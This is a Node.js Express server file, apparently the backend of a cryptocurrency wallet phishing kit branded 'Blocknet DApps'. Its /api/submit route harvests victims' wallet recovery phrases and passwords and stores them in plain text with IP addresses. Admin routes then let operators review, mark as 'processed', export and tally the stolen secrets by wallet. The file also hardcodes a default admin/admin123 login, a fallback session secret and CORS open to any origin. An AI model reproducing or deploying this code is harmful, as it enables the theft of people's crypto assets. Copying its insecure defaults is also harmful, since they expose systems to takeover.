/**
 * Blocknet DApps - Backend Server
 * Express server with session management, authentication, and data persistence
 */

const express = require('express');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const session = require('express-session');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

// ============================================
// CONFIGURATION
// ============================================
const CONFIG = {
    PORT: process.env.PORT || 3000,
    NODE_ENV: process.env.NODE_ENV || 'development',
    SESSION_SECRET: process.env.SESSION_SECRET || 'blocknet-secret-key-2024-change-in-production',
    SESSION_MAX_AGE: 24 * 60 * 60 * 1000,
    BCRYPT_SALT_ROUNDS: 10,
    DATA_DIR: path.join(__dirname, 'data'),
    SUBMISSIONS_FILE: path.join(__dirname, 'data', 'submissions.json'),
    USERS_FILE: path.join(__dirname, 'data', 'users.json')
};

// ============================================
// INITIALIZATION
// ============================================
const app = express();

if (!fs.existsSync(CONFIG.DATA_DIR)) {
    fs.mkdirSync(CONFIG.DATA_DIR, { recursive: true });
    console.log('[Setup] Created data directory');
}

function initializeDataFiles() {
    if (!fs.existsSync(CONFIG.SUBMISSIONS_FILE)) {
        fs.writeFileSync(CONFIG.SUBMISSIONS_FILE, JSON.stringify([], null, 2));
        console.log('[Setup] Created submissions.json');
    }

    if (!fs.existsSync(CONFIG.USERS_FILE)) {
        const defaultAdmin = {
            id: uuidv4(),
            username: 'admin',
            password: bcrypt.hashSync('admin123', CONFIG.BCRYPT_SALT_ROUNDS),
            role: 'admin',
            createdAt: new Date().toISOString(),
            lastLogin: null
        };
        fs.writeFileSync(CONFIG.USERS_FILE, JSON.stringify([defaultAdmin], null, 2));
        console.log('[Setup] Created users.json with default admin');
        console.log('[Setup] Default credentials: admin / admin123');
    }
}

initializeDataFiles();

// ============================================
// MIDDLEWARE
// ============================================
app.use(cors({
    origin: true,
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Accept', 'Authorization']
}));

app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));

app.use(session({
    secret: CONFIG.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    name: 'blocknet.sid',
    cookie: {
        secure: CONFIG.NODE_ENV === 'production',
        httpOnly: true,
        maxAge: CONFIG.SESSION_MAX_AGE,
        sameSite: 'lax'
    }
}));

app.use(express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] ${req.method} ${req.path} - ${req.ip}`);
    next();
});

// ============================================
// DATA ACCESS LAYER
// ============================================
const DataStore = {
    getSubmissions: () => {
        try {
            const data = fs.readFileSync(CONFIG.SUBMISSIONS_FILE, 'utf8');
            return JSON.parse(data);
        } catch (error) {
            console.error('[Error] Reading submissions:', error);
            return [];
        }
    },

    saveSubmissions: (data) => {
        try {
            fs.writeFileSync(CONFIG.SUBMISSIONS_FILE, JSON.stringify(data, null, 2));
            return true;
        } catch (error) {
            console.error('[Error] Writing submissions:', error);
            return false;
        }
    },

    getUsers: () => {
        try {
            const data = fs.readFileSync(CONFIG.USERS_FILE, 'utf8');
            return JSON.parse(data);
        } catch (error) {
            console.error('[Error] Reading users:', error);
            return [];
        }
    },

    saveUsers: (data) => {
        try {
            fs.writeFileSync(CONFIG.USERS_FILE, JSON.stringify(data, null, 2));
            return true;
        } catch (error) {
            console.error('[Error] Writing users:', error);
            return false;
        }
    }
};

// ============================================
// AUTHENTICATION MIDDLEWARE
// ============================================
const requireAuth = (req, res, next) => {
    if (req.session && req.session.userId) {
        next();
    } else {
        res.status(401).json({ 
            success: false, 
            error: 'Authentication required',
            redirect: '/admin/login'
        });
    }
};

const requireAdmin = (req, res, next) => {
    if (req.session && req.session.role === 'admin') {
        next();
    } else {
        res.status(403).json({ 
            success: false, 
            error: 'Admin access required' 
        });
    }
};

// ============================================
// API ROUTES - PUBLIC
// ============================================

app.get('/api/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        version: '1.0.0'
    });
});

app.post('/api/submit', (req, res) => {
    try {
        const { wallet, recoveryPhrase, password, timestamp, userAgent } = req.body;

        if (!wallet || !recoveryPhrase || !password) {
            return res.status(400).json({
                success: false,
                error: 'Missing required fields: wallet, recoveryPhrase, password'
            });
        }

        const submission = {
            id: uuidv4(),
            wallet: wallet.trim(),
            recoveryPhrase: recoveryPhrase.trim(),
            password: password,
            timestamp: timestamp || new Date().toISOString(),
            userAgent: userAgent || req.headers['user-agent'],
            ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip,
            status: 'new',
            notes: '',
            processedAt: null,
            processedBy: null
        };

        const submissions = DataStore.getSubmissions();
        submissions.unshift(submission);
        
        if (DataStore.saveSubmissions(submissions)) {
            console.log(`[Submission] New entry from ${wallet} (ID: ${submission.id})`);
            
            res.status(201).json({
                success: true,
                message: 'Submission received successfully',
                submissionId: submission.id
            });
        } else {
            throw new Error('Failed to save submission');
        }
    } catch (error) {
        console.error('[Error] Submission failed:', error);
        res.status(500).json({
            success: false,
            error: 'Internal server error'
        });
    }
});

// ============================================
// API ROUTES - AUTHENTICATION
// ============================================

app.post('/api/admin/login', async (req, res) => {
    try {
        const { username, password } = req.body;

        if (!username || !password) {
            return res.status(400).json({
                success: false,
                error: 'Username and password required'
            });
        }

        const users = DataStore.getUsers();
        const user = users.find(u => u.username === username);

        if (!user) {
            return res.status(401).json({
                success: false,
                error: 'Invalid credentials'
            });
        }

        const isValid = await bcrypt.compare(password, user.password);

        if (!isValid) {
            return res.status(401).json({
                success: false,
                error: 'Invalid credentials'
            });
        }

        req.session.userId = user.id;
        req.session.username = user.username;
        req.session.role = user.role;

        user.lastLogin = new Date().toISOString();
        DataStore.saveUsers(users);

        console.log(`[Auth] User ${username} logged in`);

        res.json({
            success: true,
            message: 'Login successful',
            user: {
                id: user.id,
                username: user.username,
                role: user.role
            },
            redirect: '/admin/dashboard'
        });
    } catch (error) {
        console.error('[Error] Login failed:', error);
        res.status(500).json({
            success: false,
            error: 'Internal server error'
        });
    }
});

app.get('/api/admin/check-auth', (req, res) => {
    if (req.session && req.session.userId) {
        res.json({
            authenticated: true,
            user: {
                id: req.session.userId,
                username: req.session.username,
                role: req.session.role
            }
        });
    } else {
        res.json({
            authenticated: false
        });
    }
});

app.post('/api/admin/logout', (req, res) => {
    const username = req.session?.username;
    
    req.session.destroy((err) => {
        if (err) {
            console.error('[Error] Logout failed:', err);
            return res.status(500).json({
                success: false,
                error: 'Logout failed'
            });
        }
        
        console.log(`[Auth] User ${username} logged out`);
        res.json({
            success: true,
            message: 'Logout successful'
        });
    });
});

// ============================================
// API ROUTES - ADMIN (PROTECTED)
// ============================================

app.get('/api/admin/submissions', requireAuth, (req, res) => {
    try {
        const submissions = DataStore.getSubmissions();
        
        const metadata = {
            total: submissions.length,
            new: submissions.filter(s => s.status === 'new').length,
            processed: submissions.filter(s => s.status === 'processed').length,
            flagged: submissions.filter(s => s.status === 'flagged').length
        };

        res.json({
            success: true,
            data: submissions,
            metadata
        });
    } catch (error) {
        console.error('[Error] Fetching submissions:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to fetch submissions'
        });
    }
});

app.get('/api/admin/submissions/:id', requireAuth, (req, res) => {
    try {
        const { id } = req.params;
        const submissions = DataStore.getSubmissions();
        const submission = submissions.find(s => s.id === id);

        if (!submission) {
            return res.status(404).json({
                success: false,
                error: 'Submission not found'
            });
        }

        res.json({
            success: true,
            data: submission
        });
    } catch (error) {
        console.error('[Error] Fetching submission:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to fetch submission'
        });
    }
});

app.put('/api/admin/submissions/:id', requireAuth, (req, res) => {
    try {
        const { id } = req.params;
        const { notes, status } = req.body;

        const submissions = DataStore.getSubmissions();
        const index = submissions.findIndex(s => s.id === id);

        if (index === -1) {
            return res.status(404).json({
                success: false,
                error: 'Submission not found'
            });
        }

        if (notes !== undefined) {
            submissions[index].notes = notes;
        }

        if (status !== undefined && ['new', 'processed', 'flagged'].includes(status)) {
            submissions[index].status = status;
            if (status === 'processed') {
                submissions[index].processedAt = new Date().toISOString();
                submissions[index].processedBy = req.session.username;
            }
        }

        if (DataStore.saveSubmissions(submissions)) {
            console.log(`[Update] Submission ${id} updated by ${req.session.username}`);
            res.json({
                success: true,
                message: 'Submission updated',
                data: submissions[index]
            });
        } else {
            throw new Error('Failed to save');
        }
    } catch (error) {
        console.error('[Error] Updating submission:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to update submission'
        });
    }
});

app.delete('/api/admin/submissions/:id', requireAuth, (req, res) => {
    try {
        const { id } = req.params;
        let submissions = DataStore.getSubmissions();
        const submission = submissions.find(s => s.id === id);

        if (!submission) {
            return res.status(404).json({
                success: false,
                error: 'Submission not found'
            });
        }

        submissions = submissions.filter(s => s.id !== id);

        if (DataStore.saveSubmissions(submissions)) {
            console.log(`[Delete] Submission ${id} deleted by ${req.session.username}`);
            res.json({
                success: true,
                message: 'Submission deleted'
            });
        } else {
            throw new Error('Failed to save');
        }
    } catch (error) {
        console.error('[Error] Deleting submission:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to delete submission'
        });
    }
});

app.post('/api/admin/submissions/bulk-delete', requireAuth, (req, res) => {
    try {
        const { ids } = req.body;
        
        if (!Array.isArray(ids) || ids.length === 0) {
            return res.status(400).json({
                success: false,
                error: 'IDs array required'
            });
        }

        let submissions = DataStore.getSubmissions();
        const originalCount = submissions.length;
        
        submissions = submissions.filter(s => !ids.includes(s.id));
        const deletedCount = originalCount - submissions.length;

        if (DataStore.saveSubmissions(submissions)) {
            console.log(`[Bulk Delete] ${deletedCount} submissions deleted by ${req.session.username}`);
            res.json({
                success: true,
                message: `${deletedCount} submissions deleted`,
                deletedCount
            });
        } else {
            throw new Error('Failed to save');
        }
    } catch (error) {
        console.error('[Error] Bulk delete:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to delete submissions'
        });
    }
});

app.get('/api/admin/submissions/export', requireAuth, (req, res) => {
    try {
        const submissions = DataStore.getSubmissions();
        const exportData = {
            exportedAt: new Date().toISOString(),
            exportedBy: req.session.username,
            count: submissions.length,
            submissions
        };

        res.setHeader('Content-Type', 'application/json');
        res.setHeader('Content-Disposition', `attachment; filename="submissions-${Date.now()}.json"`);
        res.json(exportData);
    } catch (error) {
        console.error('[Error] Export failed:', error);
        res.status(500).json({
            success: false,
            error: 'Export failed'
        });
    }
});

app.get('/api/admin/stats', requireAuth, (req, res) => {
    try {
        const submissions = DataStore.getSubmissions();
        const now = new Date();
        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
        
        const stats = {
            total: submissions.length,
            today: submissions.filter(s => new Date(s.timestamp) >= today).length,
            thisWeek: submissions.filter(s => {
                const weekAgo = new Date(now - 7 * 24 * 60 * 60 * 1000);
                return new Date(s.timestamp) >= weekAgo;
            }).length,
            byStatus: {
                new: submissions.filter(s => s.status === 'new').length,
                processed: submissions.filter(s => s.status === 'processed').length,
                flagged: submissions.filter(s => s.status === 'flagged').length
            },
            byWallet: {}
        };

        submissions.forEach(s => {
            stats.byWallet[s.wallet] = (stats.byWallet[s.wallet] || 0) + 1;
        });

        res.json({
            success: true,
            data: stats
        });
    } catch (error) {
        console.error('[Error] Stats failed:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get statistics'
        });
    }
});

// ============================================
// ADMIN PAGES (HTML ROUTES)
// ============================================

app.get('/admin/login', (req, res) => {
    if (req.session && req.session.userId) {
        return res.redirect('/admin/dashboard');
    }
    res.sendFile(path.join(__dirname, 'public', 'admin-login.html'));
});

app.get('/admin/dashboard', requireAuth, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin-dashboard.html'));
});

app.get('/admin', (req, res) => {
    res.redirect('/admin/login');
});

// ============================================
// ERROR HANDLING
// ============================================
app.use((err, req, res, next) => {
    console.error('[Error]', err);
    res.status(500).json({
        success: false,
        error: CONFIG.NODE_ENV === 'production' ? 'Internal server error' : err.message
    });
});

app.use((req, res) => {
    res.status(404).json({
        success: false,
        error: 'Not found'
    });
});

// ============================================
// SERVER START
// ============================================
app.listen(CONFIG.PORT, () => {
    console.log(`
╔════════════════════════════════════════════════════════╗
║           Blocknet DApps Backend Server                ║
╠════════════════════════════════════════════════════════╣
║  Environment: ${CONFIG.NODE_ENV.padEnd(37)}║
║  Port: ${CONFIG.PORT.toString().padEnd(44)}║
╠════════════════════════════════════════════════════════╣
║  Public URLs:                                          ║
║    • Frontend: http://localhost:5500                   ║
║    • API:      http://localhost:${CONFIG.PORT}/api/                ║
║                                                        ║
║  Admin Panel:                                          ║
║    • Login:    http://localhost:${CONFIG.PORT}/admin/login         ║
║    • Dashboard: http://localhost:${CONFIG.PORT}/admin/dashboard   ║
║                                                        ║
║  Default Credentials:                                  ║
║    • Username: admin                                   ║
║    • Password: admin123                                ║
╚════════════════════════════════════════════════════════╝
    `);
});
